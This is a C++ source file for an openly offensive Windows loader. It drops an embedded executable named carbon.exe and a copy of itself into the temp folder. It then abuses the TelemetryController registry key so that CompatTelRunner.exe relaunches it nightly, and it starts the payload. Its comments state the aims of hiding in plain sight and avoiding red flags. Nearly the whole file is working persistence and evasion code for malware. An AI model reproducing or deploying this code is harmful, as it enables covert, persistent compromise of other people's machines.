/*+===================================================================
  File:      Loader.cpp

  Summary:   This file contains code for the tool's loader.
             The loader is responsible for making sure our presistence
             is not ruined, and running our tool if it's not already
             running.
             The reason this needs a different exe is that the process
             that CompatTelRunner.exe ends up running will block the 
             rest of the telemetry from running.
             So in order to avoid raising some red flags, we defer our
             tool to another process and terminate this one.

  Functions: 

===================================================================+*/

#include <Windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <cstdio>
#include "resource.h"
using namespace std;

int check_if_file_exists(string sPath)
{
    /*
    * This function checks if a file already exists or not using winapi.
    * According to a benchmark someone posted in SO, this is a lot faster than requesting
    * the file and seeing if it fails or not.
    * 
    * param sPath: std::string. The path of the file to check for.
    * 
    * return: 1 if an error has occured, 0 if successful.
    */
    if (INVALID_FILE_ATTRIBUTES == GetFileAttributesA(sPath.c_str()) && GetLastError() == ERROR_FILE_NOT_FOUND)
    {
        return 0;
    }
    return 1;

}

int put_payload_in_temp(char** argv)
{
    /*
    * This function puts our loader and carbon.exe in the system's temp
    * folder, if they don't already exist there, in where they can hopefully hide in plain sight.
    * 
    * param argv: the program's arguments, in order to know where we are running from
    *             in an easy way.
    * 
    * return: 1 if an error has occured, 0 if successful.
    */
    HRSRC hResource = FindResource(NULL, MAKEINTRESOURCE(IDB_EMBEDEXE), RT_RCDATA);
    if (!hResource)
        return 1;

    HGLOBAL hGlobal = LoadResource(NULL, hResource);
    if (!hGlobal)
        return 1;

    DWORD nExeSize = SizeofResource(NULL, hResource);
    if (!nExeSize)
        return 1;

    void* pFileBuffer = LockResource(hGlobal);
    if (!pFileBuffer)
        return 1;

    char sTempPath[MAX_PATH] = {};
    if (!GetTempPathA(MAX_PATH, sTempPath))
        return 1;

    string sFullPath = string(sTempPath) + "carbon.exe";
    if (!check_if_file_exists(sFullPath))
    {
        ofstream outfile(sFullPath.c_str(), ios::binary);
        if (!outfile.is_open())
            return 1;
        int res = (outfile.write((char*)pFileBuffer, nExeSize)) ? 0 : 1;
        outfile.close();
        return res;

    }
    string sLoaderPath = string(sTempPath) + "loader.exe";
    CopyFileA(argv[0], sLoaderPath.c_str(), TRUE); // No need to check if the file exists because windows does that for us.

    return 0;
}

int create_persistence_reg_value()
{
    /*
    * This function creates our persistence.
    * It first creates a registry key under "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController"
    * called "carbon". It then creates values that tells "CompatTelRunner.exe" to run our loader once per day.
    * 
    * return: 1 if an error has occured, 0 if successful.
    */
    HKEY hKey;
    HKEY hResultKey;
    DWORD nFunc;
    LPCSTR lpSubKey = "Carbon";
    LPCSTR sRootKeyName = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController";
    LPCSTR lpCommandValue = "Command";
    LPCSTR lpNightlyValue = "Nightly";
    DWORD iEnabled = 0x1;
    LONG lResult;
    lResult = RegOpenKeyExA(HKEY_LOCAL_MACHINE, sRootKeyName, 0, KEY_CREATE_SUB_KEY, &hKey);
    if (lResult != ERROR_SUCCESS)
    {
        if (lResult == ERROR_FILE_NOT_FOUND) {
            printf("Key not found.\n");
            return 1;
        }
        else {
            printf("Error opening key.\n");
            return 1;
        }
    }
    // Note: REG_OPTION_VOLATILE might be interesting to experiment with
    // if you're after something that's more "single use".
    lResult = RegCreateKeyExA(hKey, lpSubKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hResultKey, &nFunc); 
    if (lResult != ERROR_SUCCESS)
    {
        return 1;
    }
    RegCloseKey(hKey);
    hKey = (HKEY)NULL;
    char sTempPath[MAX_PATH] = {};
    if (!GetTempPathA(MAX_PATH, sTempPath))
        return 1;

    string sFullPath = string(sTempPath) + "loader.exe";
    const char* sValueData = sFullPath.c_str();
    lResult = RegSetValueExA(hResultKey,lpCommandValue, 0, REG_SZ, (LPBYTE)sValueData, strlen(sValueData)+1);
    if (lResult != ERROR_SUCCESS)
    {
        RegCloseKey(hResultKey);
        hResultKey = (HKEY)NULL;
        return 1;
    }
    lResult = RegSetValueExA(hResultKey, lpNightlyValue, 0, REG_DWORD, (LPBYTE)&iEnabled, sizeof(DWORD));
    if (lResult != ERROR_SUCCESS)
    {
        RegCloseKey(hResultKey);
        hResultKey = (HKEY)NULL;
        return 1;
    }
}
int create_payload_process()
{
    /* 
    *  This function opens carbon.exe with current privelages.
    * 
    *  return: 1 if an error has occured, 0 if successful.
    */
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    char* sProcessName;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    char sTempPath[MAX_PATH] = {};
    if (!GetTempPathA(MAX_PATH, sTempPath))
        return 1;

    string sFullPath = string(sTempPath) + "carbon.exe";
    sProcessName = _strdup(sFullPath.c_str());

    if (!CreateProcessA(NULL,   // No module name (use command line)
        sProcessName,        // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi)           // Pointer to PROCESS_INFORMATION structure
        )
    {
        printf("CreateProcess failed (%d).\n", GetLastError());
        return 1;
    }
    printf("created %s", sProcessName);
    return 0;

}

int main(int argc, char** argv) {
    /* 
    * Code execution begins here!
    * We need argv so we know where we are executed at.
    */

    int iResult;
    iResult = put_payload_in_temp(argv);
    if (iResult == 1)
    {
        printf("an error has occured.");
        return;
    }
    iResult = create_persistence_reg_value();
    if (iResult == 1)
    {
        printf("an error has occured.");
        return;
    }
    iResult = create_payload_process();
    if (iResult == 1)
    {
        printf("an error has occured.");
        return;
    }
    return 0;
}
